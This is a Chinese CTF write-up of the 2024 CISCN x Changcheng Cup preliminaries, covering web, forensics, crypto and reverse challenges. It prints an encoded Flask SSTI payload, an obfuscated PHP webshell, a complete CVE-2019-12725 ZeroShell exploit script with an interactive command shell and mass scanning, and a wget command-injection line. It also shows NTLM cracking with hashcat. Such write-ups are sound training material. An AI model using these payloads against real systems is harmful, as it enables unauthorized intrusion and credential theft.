---
title: "2024 CISCN X 长城杯铁人三项 初赛"
description: "2024 CISCN x 长城杯铁人三项 初赛 WriteUp By Rweboy"

date: 2024-12-16T08:41:11+08:00
lastmod: 2025-11-11T14:46:49+08:00

math: true
mermaid: true

categories:
  - Writeup
tags:
  - CTF
---
<!--more-->

# WEB

## Safe_Proxy

题目一进去就给了源码,里面是一个简单的 ssti,但是无回显不出网

```php
from flask import Flask, request, render_template_string
import socket
import threading
import html

app = Flask(__name__)

@app.route('/', methods=["GET"])
def source():
    with open(__file__, 'r', encoding='utf-8') as f:
        return '<pre>'+html.escape(f.read())+'</pre>'

@app.route('/', methods=["POST"])
def template():
    template_code = request.form.get("code")
    # 安全过滤
    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
    for black in blacklist:
        if black in template_code:
            return "Forbidden content detected!"
    result = render_template_string(template_code)
    print(result)
    return 'ok' if result is not None else 'error'

class HTTPProxyHandler:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

    def handle_request(self, client_socket):
        try:
            request_data = b""
            while True:
                chunk = client_socket.recv(4096)
                request_data += chunk
                if len(chunk) < 4096:
                    break

            if not request_data:
                client_socket.close()
                return

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:
                proxy_socket.connect((self.target_host, self.target_port))
                proxy_socket.sendall(request_data)

                response_data = b""
                while True:
                    chunk = proxy_socket.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk

            header_end = response_data.rfind(b"\r\n\r\n")
            if header_end != -1:
                body = response_data[header_end + 4:]
            else:
                body = response_data
                
            response_body = body
            response = b"HTTP/1.1 200 OK\r\n" \
                       b"Content-Length: " + str(len(response_body)).encode() + b"\r\n" \
                       b"Content-Type: text/html; charset=utf-8\r\n" \
                       b"\r\n" + response_body

            client_socket.sendall(response)
        except Exception as e:
            print(f"Proxy Error: {e}")
        finally:
            client_socket.close()

def start_proxy_server(host, port, target_host, target_port):
    proxy_handler = HTTPProxyHandler(target_host, target_port)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(100)
    print(f"Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}...")

    try:
        while True:
            client_socket, addr = server_socket.accept()
            print(f"Connection from {addr}")
            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("Shutting down proxy server...")
    finally:
        server_socket.close()

def run_flask_app():
    app.run(debug=False, host='127.0.0.1', port=5000)

if __name__ == "__main__":
    proxy_host = "0.0.0.0"
    proxy_port = 5001
    target_host = "127.0.0.1"
    target_port = 5000

    # 安全反代，防止针对响应头的攻击
    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))
    proxy_thread.daemon = True
    proxy_thread.start()

    print("Starting Flask app...")
    run_flask_app()

```

直接本地启服务,设置回显让 fenjing 一把梭得出绕过黑名单的命令

一开始想复杂了,打算拿内存马打,之后又看到一篇[基于错误页面的回显](https://xz.aliyun.com/t/16325?time__1311=GuD%3D0KAKYK7KiKDsD7%2Bd0%3D6RL%3DdGC3IztjeD#toc-2),但是拿 fenjing 的 payload 梭不好使.打算自己本地手敲一个。

想尝试写文件的，但是页面还是会报错

后来又想到之前鹏程杯那道 python 题,也是无回显不出网,当时直接把 flag 写到 app.py 上,这次也试试看.

![image-20241216084748633](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216084800322-1614287045.png)

payload:

```php
code=%7B%25set%20gl%3D'_'*2%2B'globals'%2B'_'*2%25%7D%7B%25set%20bu%3D'_'*2%2B'builtins'%2B'_'*2%25%7D%7B%25set%20im%3D'_'*2%2B'i''mport'%2B'_'*2%25%7D%7B%25set%20oe%3D'so'%5B%3A%3A-1%5D%25%7D%7B%7Bg.pop%5Bgl%5D%5Bbu%5D%5Bim%5D(oe)%5B'p''open'%5D('cat%20%2Fflag%20%3E%20app.py').read()%7D%7D
```

![image-20241216084910073](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216084920779-735291526.png)

工具链接：[https://github.com/Marven11/FenJing](https://github.com/Marven11/FenJing)

`flag{9cb84d61-9040-47d7-b5ef-4c88ffa6e317}`


## hello_web

这题一进去就是一个很可疑,带有文件包含的 url,查看源代码后更是有两个提示

![image-20241216084916854](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216084927363-2098915863.png)

肯定是需要文件包含来读取这两个文件.

经过在 file 参数上的 fuzz,发现他限制长度13 过滤`php://`, `data` ,`input`,这样伪协议几乎是用不了

在尝试在 file 参数上进行目录穿越的时候发现`../`不被解析,然后`../`也没被 ban

![image-20241216084921904](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216084932527-2092266536.png)

既然他 ban `../`的情况下,那么就是将`../`过滤了,尝试传入

```php
http://eci-2zecjw6gho6wjsdwij1l.cloudeci1.ichunqiu.com/index.php?file=..././tips.php
```

![image-20241216084930190](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216084940869-327419950.png)

之后访问 hackme.php

```php
<?php
highlight_file(__FILE__);
$lJbGIY="eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME";$OlWYMv="zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel";$lapUCm=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$YwzIst=$lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};$OxirhK=$lapUCm{33}.$lapUCm{10}.$lapUCm{24}.$lapUCm{10}.$lapUCm{24};$YpAUWC=$OxirhK{0}.$lapUCm{18}.$lapUCm{3}.$OxirhK{0}.$OxirhK{1}.$lapUCm{24};$rVkKjU=$lapUCm{7}.$lapUCm{13};$YwzIst.=$lapUCm{22}.$lapUCm{36}.$lapUCm{29}.$lapUCm{26}.$lapUCm{30}.$lapUCm{32}.$lapUCm{35}.$lapUCm{26}.$lapUCm{30};eval($YwzIst("JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="));
?>
```

是一个混淆的代码,本地反混淆得到连接密码,直接蚁剑连接

![image-20241216084939618](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216084950610-1843665184.png)

由于前面的 tips.php 能看到 disable_function 禁用了许多危险函数,在 LFI 文件夹新建一个马

![image-20241216085031196](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085041869-313494412.png)

再次用蚁剑连接 a.php,并用插件来绕过 disable_fuction 即可

![image-20241216085036873](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085047825-286970171.png)

连接生成的`.antproxy.php`

![image-20241216085043576](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085054238-2085140919.png)

通过 find 找到 flag

![image-20241216085048690](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085059272-25961471.png)

`flag{91a89c19-e322-4ceb-8789-0bbc09b033f5}`

# 威胁检测与网络流量分析

## zeroshell_1

直接CTF-NetA扫描，看见Referer。

![image-20241216085125418](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085136211-1607001841.png)

直接Cyberchef解码，得到flag

![image-20241216085153708](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085204370-212498903.png)

`flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}`

## zeroshell_2

根据手册搭建环境，

![image-20241216085218365](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085229026-1094870602.png)

然后去网上搜zeroshell的exp直接搜到CVE-2019-12725随便找一个exp。我找的这个[CVE-2019-12725](https://gryffinbit.top/2022/11/16/ZeroShell-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-12725/)

```python
import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


def check_vuln(url):
	url = parse.urlparse(url)
	url2=url.scheme + '://' + url.netloc 
	headers = {
		'User-Agent': get_ua(),
	}
	# data=base64.b64encode("eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=")
	try:
		res2 = requests.get(url2 + '/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27',headers=headers,timeout=10,verify=False)
		if res2.status_code==200 and "uid" in res2.text:
			print("\033[32m[+]%s is vuln\033[0m" %url2)
			return 1
		else:
			print("\033[31m[-]%s is not vuln\033[0m" %url1)
	except Exception as e:
		print("\033[31m[-]%s is timeout\033[0m" %url2)


#cmdshell
def cmdshell(url):
	if check_vuln(url)==1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A'
		while 1:
			shell = input("\033[35mcmd: \033[0m")
			if shell =="exit":
				sys.exit(0)
			else:
				headers = {
					'User-Agent': get_ua(),
					}
				try:
					res = requests.get(url1 + shell + '%0A%27',headers=headers,timeout=10,verify=False)
					if res.status_code==200 and len(res.text) != 0:
						vulntext=res.text.split('<html>')
						print("\033[32m%s\033[0m" %vulntext[0])
					else:
						print("\033[31m[-]%s Command execution failed !\033[0m" %url1)
				except Exception as e:
					print("\033[31m[-]%s is timeout!\033[0m" %url1)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''
	 _____ _   _ _____       _____  _____  __   _____        __   _____  ___________  _____ 
	/  __ \ | | |  ___|     / __  \|  _  |/  | |  _  |      /  | / __  \|___  / __  \|  ___|
	| /  \/ | | | |__ ______`' / /'| |/' |`| | | |_| |______`| | `' / /'   / /`' / /'|___ \ 
	| |   | | | |  __|______| / /  |  /| | | | \____ |______|| |   / /    / /   / /      \ \
	| \__/\ \_/ / |___      ./ /___\ |_/ /_| |_.___/ /      _| |_./ /___./ /  ./ /___/\__/ /
	 \____/\___/\____/      \_____/ \___/ \___/\____/       \___/\_____/\_/   \_____/\____/ 
                                                                                        
                                                                                                                                                                                                                  
                                                                                                      
                              		                     CVE-2019-12725 By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='CVE-2019-12725 By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	arg.add_argument("-c",
					"--cmd",
					help="Target URL; Example:http://ip:port")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	print('[*]任务开始...')
	if url != None and cmd == None and filename == None:
		check_vuln(url)
	elif url == None and cmd == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			check_vuln(i)
		end=time()
		print('任务完成，用时%d' %(end-start))
	elif url == None and cmd != None and filename == None:
		cmdshell(cmd)
```

然后运行，

![image-20241216085252236](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085303408-1275301654.png)

然后去找flag，在`/Database/flag`下面。

![image-20241216085257643](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085308199-886976928.png)

`flag{c6045425-6e6e-41d0-be09-95682a4f65c4}`

## zeroshell_3

查看主机的外联服务器的所有TCP，UDP，IP和进程使用

```bash
netstat -antp
```

（但是有点抽象，有时候看不到那个IP，）其他都是127.0.0.1只有他一个。

![image-20241216085355787](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085406663-304992750.png)

`flag{202.115.89.103}`

## zeroshell_4

直接找可执行文件像.sh或者.nginx这种使用命令

```bash
find / -name ".sh"
find / -name ".nginx"
```

.sh文件没有，发现.nginx很多，尝试一下。

![image-20241216085749134](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085759698-1634771253.png)

![image-20241216085905063](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085915696-1839610967.png)

`flag{.nginx}`

## zeroshell_5

本身是一个RCE的洞，可以直接远程下载，用wget

```python
wget "http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec='cat%20/tmp/.nginx'%0A'"
```

然后直接把1.nginx dump下来，拉到ida，然后shift+f12直接找密钥了

![image-20241216085938811](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216085949719-1509725601.png)

`flag{11223344qweasdzxc}`

## zeroshell_6

题目说找到木马的启动项，直接ps -aux查看进程发现很多apache自带的进程，可疑的就几个，注意看这个进程

![image-20241216090004900](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090015789-1349072241.png)

一级一级网上找然后在system目录下面发现一个startup

![image-20241216090020550](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090031219-684402653.png)

往startup下面一个个找也不多，然后找到最终地方

![image-20241216090028452](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090039122-1056220359.png)

`flag{/var/register/system/startup/scripts/nat/File}`

## WinFT_1

题目说找受控机木马的回连域名及ip及端口，

直接看机器里面的第一个文件exe

![image-20241216090508053](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090519510-272396622.png)

看见最后一个进程里面就有，得到flag

`flag{miscsecure.com:192.168.116.130:443}`

## WinFT_2

说是启动项里面的flag一开始还是去msconfig里面找的，结果不知道，一想肯定不是exe，然后去计划任务看，

![image-20241216090536136](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090546842-57224494.png)

然后放Cyberchef里面解出来。

![image-20241216090542540](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090553292-1213496669.png)

解出flag

`flag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}`

## WinFT_5

直接把流量放kali里面，binwalk分析

![image-20241216090658443](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090709285-1559417030.png)

发现位于22258409的偏移位置存在flag.txt

![image-20241216090703882](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090714616-1417817657.png)

使用dd命令分离，提取出来

![image-20241216090709460](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090720160-2147403155.png)

发现需要密码，

![image-20241216090718742](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090729621-221989880.png)

然后把zip放0101里面，发现有东西，

![image-20241216090724351](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090734963-1252085038.png)

放到Cyberchef里面解出密码：时间线关联非常重要

![image-20241216090735485](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090746208-2119841521.png)

解出flag

`flag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}`

## sc05_1

这个题直接打开execl，转到tcp-export的位置，直接找到时间

![image-20241216090802255](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090813314-536377005.png)

2024/11/09_16:22:42这是时间，MD5编码一下

![image-20241216090829208](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216090839866-1852212176.png)

得到`flag{01DF5BC2388E287D4CC8F11EA4D31929}`

## Kiwi

exe直接拉ida之后，发现是个`mimikatz`程序，`lsadump::lsa /patch` 是这个程序的命令参数，作用是导出lsa，目的就是找这个东西，所以本题的逻辑就是去逆这个玩意儿

![image-20241216091114310](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091125302-903395086.png)

主要看下面的几个函数，先看函数sub_140082974，先是对input有一步异或，异或的逻辑是初始化了一个变量v6，而v6的值可以通过变量unk_140111152中有一个获取，然后循环v5的次数，得到v6的值，就是一个伪随机数，然后得到的数再在下面做一个变表的base64

![image-20241216091122644](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091133647-585107726.png)

![image-20241216091129821](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091140755-348375415.png)

最后main里面的函数sub_140082774感觉就是一个将加密之后的结果上传的功能，然后给了流量包，那么去流量包里找密文即可

![image-20241216091140032](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091150949-544335224.png)

然后去看流量包，筛选一下http流量的upload流

![image-20241216091147708](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091158279-451596707.png)

然后发现三个包里的密文都是一样的

![image-20241216091155375](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091206352-768869769.png)

那么直接逆即可，懒得模拟随机数v6计算的过程，直接动调随机数种子就好了，然后直接解变表之后的数据即可

![image-20241216091216995](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091227952-1415334478.png)

```cpp
#include <stdio.h>
#include <stdlib.h>
int main()
{

    unsigned int temp[178]={0xb9,0x48,0x1c,0x58,0x81,0x4f,0x51,0x7d,0x27,0x70,0x33,0x6f,0x79,0x48,0x82,0x21,0x08,0x80,0x79,0x49,0x51,0x52,0x28,0x9b,0x7d,0xbb,0x40,0x67,0x45,0x7a,0x96,0x38,0x3e,0x7d,0x41,0x42,0x86,0x60,0x4f,0x6c,0x3b,0x87,0x2e,0x26,0x72,0x51,0x83,0x80,0x79,0xbd,0x79,0x40,0x67,0x71,0x4a,0xa2,0x98,0x76,0x3a,0x8f,0x68,0xda,0x7f,0x74,0x2a,0x33,0x55,0x8d,0x5e,0x2b,0x39,0x6d,0xbe,0x5f,0x74,0x74,0x7d,0x11,0x8e,0x4b,0x4d,0x99,0x64,0x79,0x63,0xb3,0x73,0xca,0x31,0x90,0xc3,0x77,0x1b,0x6f,0x61,0x52,0x11,0xbc,0xbd,0x86,0xb2,0x78,0x4f,0x7e,0x56,0x8f,0x6c,0x94,0xb4,0x3a,0x7f,0x14,0x4b,0x79,0xb6,0x8c,0xb0,0xad,0x8b,0x67,0x6d,0xd1,0x7a,0x9a,0xa7,0x31,0x74,0x25,0x3e,0x61,0x2e,0x82,0x3d,0x63,0x5e,0x77,0x6b,0x7c,0x3f,0x24,0x65,0x35,0x9f,0x53,0x84,0x92,0x42,0xa0,0x7d,0x66,0x70,0x3b,0xd3,0x65,0xa2,0x6d,0x7f,0x19,0x92,0x7a,0x8c,0xb8,0x6b,0x12,0x18,0x66,0x74,0xc0,0x48,0x64,0x9d,0x0e,0x6f,0x53,0x96,0x49,0x61,0x5d};
    unsigned int bbq;
    srand(0x69);
    for(int i=0;i<178;i++)
        {
            bbq=temp[i]-(rand()%128);

            printf("%c",bbq^0x69&0xff);
        }


    return 0;
}
```

![image-20241216091225651](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091236273-1371002148.png)

然后直接把Lihua的NTLM去撞一下hash

直接上工具，得到密码

```cpp
hashcat -m 1000 -a 0 --force 23d1e086b85cc18587bbc8c33adefe07 /usr/share/wordlists/rockyou.txt
```

![image-20241216091239077](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091249996-1016038955.png)

`flag{memeallme!}`

# Crypto

## rasnd

基本上和DownUnderCTF apbq rsa i一致，密码系统的漏洞在于$x_1,x_2$的位数太小了，我们可以对hint1和hint2两边分别乘上$x_2,x_1$，然后两式相减构造出因子$q$，这样一来我们就可以和模数$n$求gcd得到我们的p，q了，完整的推导过程如下

![image-20241216091535974](https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091546611-1355733929.png)

第一段flag的脚本拿maple的改改就行了

```python
from Crypto.Util.number import *
from itertools import *
from tqdm import *
from gmpy2 import *

n1 = 12041484248912643032281827138855623754144214035159379257661479163138740691775879744970066188895287834305299993544492956391792960896102848747030186725527727462894712060700333010084161232292945341786532686079371670477415860442278642697221340583569645588845014599550638325912186989334147835969874061056581067882184577796454285728001596032991576548616505694738258644347926711399658118922938510938119887205321934129700411659944514995029920532395752664247590123953777766329926456117538440392869407741390284440815213055049158646992117671363087867033230162348771385273345393144890080701361216495994574190386498448916311816797
c1 = 10606131316309955980934489999367845331927443863828583686141238316607269050684817039429298888781427841737522428868990033129396359422071583487650116153933235992772589074023014756603570826140692683719646462908402695451323182710065741160367461533107537946979392683247488668328727583897596393913788430745564403219132250771930726681544778750383056036694256341891369906160656846870749190113082284100872538571850988590168260190474932411452384081833324921809119609733433067883975638920071176430344363427978212930714208437515478915112319607619770956843101985777866969917968203033417800410149877887005212278008964025655987940957
hint1 = 1210163329385529229728939135743311954497267498380547164909234906003973611593798031761260290741249172090725684217414693693114449324670072882779106749063248097663867799443199777334875204112817022790357889479347171489446008099356250837065466918892616549927163255749494695158589358908509028746798132552909553239850862487264153570503905570515124883
hint2 = 5051204836955493115902299043864227023948832461277034652488258835184221521626345855566463934505556519381805282442109159775267806057755363491698274342564684351612127794982915561668169373789547317570427657539052251405041553056803632890416687608340386053780952769614333767097202054166611376586274576239144083005297435121927157297060690207800186682896326015350219721047026234504118337172881814255423542199000966155216738725842757720428244680380446841837035234700310983
apbq1 = hint1 + 0x114
apbq2 = hint2 + 0x514

h1, h2 = apbq1, apbq2
for a1, a2 in product(trange(2**12), repeat=2):
    q = gcd(a1*h1 - a2*h2, n1)
    if q != 1 and q<n1:
        print(q,n1)
        break

e = 0x10001
q = 114411205592246972220921230297242077940657645574270285474331214662896407392806621491630870605100409685745977685037681045756459767749822052290189670280723035164949944851395458359172624983161919320250363279972807380631771541310372109230847026234642522745139142418827828880645203931389076624693764995135409308641
p = n1 // q
phi = (p-1)*(q-1)
d = invert(e, phi)
flag = long_to_bytes(pow(c1, d, n1))
print(flag)
```

得到第一段flag：flag{d50d53cd-e2ce-

![image-20241216091551494](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091602094-2096860699.png)



第二部分就是一个有限域下的逆元，对hint求逆元我们可以得到两个等式

![image-20241216091612697](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091623283-945716044.png)

直接z3解方程，脚本如下

```python
from Crypto.Util.number import *
from z3 import *

n2 = 21626909171908453692251924387103943429444078378390804029791359086344901457614128315777353777946154715705188025455454883506581852192745448695330171712065848059085447176298338547611168540505303622649991647459241389851267706481741195973923366166350969428740106246575652922070364437283707248673414247015834408154336841845500174634585533145550612240655077795822499312831628265010867392272132327421316583927430144370227936025377802536431841460046560013098106494136549616711676888653891244666437683890387799042293066126208312839317392500611947692798756916972089791796065424069966139988959825520104626886407271566397598014479
c2 = 569516604779891642229626563202425917599205242605000009759024900334197676760498875709356073629224710968242118774272590035957794014944814569027666346273772760891740151661832004406395109811886627118507348575757378450205961170154177578337894121169344562117847542197369098179880407292635572736750972421301634710104680523760640958412310434786115630793487435865984193741176650867539434921286751815555011295375372628772142693142157388409831904845942568574027054385393890634270431602503271189772689768282466095937885481574735502991070696612305833770499878657295850059864341504403869711352220766605065553807072723398104147275
hint = 7354993101719521835942057560559580408743463323132751631614029356471066763586282676677888312943475827012461736138179904586928941942658362522899594590538632189792057377645275207357701819794899897630241261959366946307314047096789448491079019668061348270530520611478739108630519794038167843924690066067571126829134798676602734885527731532719971211866068475981470917729745697545742042055696088126726481101239997605997896836996320123720551222524217796125190116733813486368990126242621202368626320634775326774029367415577855148616903730121702683124218622095514962048699336270886055555358735126758449948884277874079744761833

x = inverse(hint, n2)

solver = Solver()

p = Int('p')
q = Int('q')

solver.add(514 * p - 114 * q == x)
solver.add(p * q == n2)

if solver.check() == sat:
    model = solver.model()
    p_val = model[p].as_long()
    q_val = model[q].as_long()

    d = inverse(0x10001, (p_val - 1) * (q_val - 1))
    m = pow(c2, d, n2)
    print(long_to_bytes(m))
```

得到后一段flag：453b-b352-ab1385bd22af}

![image-20241216091633317](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091644221-341610445.png)

得到最终flag：

`flag{d50d53cd-e2ce-453b-b352-ab1385bd22af}`

# Reverse

## ezCsky

题目提示使用了国产的交叉编译链对tbox的固件程序进行了编译，ida直接反编译的话会有一个异架构异常，网上搜一下，找到一篇[参考文章](https://www.iotsec-zone.com/article/379)，然后直接用arm小端反编译，还是很难看

![image-20241216091725499](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091736250-732638104.png)

但是基本的加密逻辑能大概看出来，有RC4有异或unk_8AA0

![image-20241216091730600](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091741237-1476403439.png)

没办法调，这块儿fuzz了好久，密文肯定是无脑存unk_8AA0的，key是"testkey"，肯定是用于RC4的key是没得跑的，但是不知道有没有用这个还有异或的逻辑，后面一步步fuzz的，先解RC4再解xor，先xor再RC4，然后试探xor的逻辑选取常见的那几种，要不就是对上面的key的模取异或，要不就是经典的前一个等于前一个异或后一个，然后逆回去，最后fuzz了很久（雾）。。。。

最终的逆向逻辑是先无魔改RC4，然后走一个前后异或（从最后一个异或回去即可）

![image-20241216091736652](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091747672-740300043.png)

```python
key="testkey"

data=[0x0a,0x0d,0x06,0x1c,0x1f,0x54,0x56,0x53,0x57,0x51,0x00,0x03,0x1d,0x14,0x58,0x56,0x03,0x19,0x1c,0x00,0x54,0x03,0x4b,0x14,0x58,0x07,0x02,0x49,0x4c,0x02,0x07,0x01,0x51,0x0c,0x08,0x00,0x01,0x00,0x03,0x00,0x4f,0x7d]


# for k in range(len(data)):
#     data[k]=data[k]^key[k%7]


for i in range(len(data)-1,0,-1):
    data[i-1]^=data[i]

for j in range(len(data)):
    print(chr(data[j]),end='')
```

`flag{d0f5b330-9a74-11ef-9afd-acde48001122}`

## dump

（最可惜的一题，拿到附件测了两下就知道可以黑盒fuzz了，不是00情况多种的话，我手爆感觉能有血，呜呜呜），先拉到ida大概看了一下，属于是又臭又长，但是看见有命令行里的传参

![image-20241216091810486](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091821240-2041104139.png)

就测了两下，对照密文

![image-20241216091821052](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091831890-1363112404.png)

![image-20241216091826661](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091837256-2095190718.png)

脑神经寻思紧绷，直接测所有可见字符就好了，奈何测上道题给我榨干了，爆破脚本不太会搓了，直接手撕，给所有可见字符编一下码，接下来就是体力活儿了

![image-20241216091833780](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091844450-1976891504.png)

```python
0x00 0x1C 0x1D 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x02 0x03 0x04 0x05 0x06 0x07 0x08 0x09 0x0A 0x0B 0x0C 0x0D 0x0E 0x0F 0x10 0x11 0x12 0x13 0x14 0x15 0x16 0x17 0x18 0x19 0x1A 0x1B 0x00 0x1E 0x1F 0x20 0x21 0x22 0x23 0x24 0x25 0x26 0x27 0x28 0x29 0x2A 0x2B 0x2C 0x2D 0x2E 0x2F 0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x39 0x00

flag{MTczMDc?MzQ2Ng==}
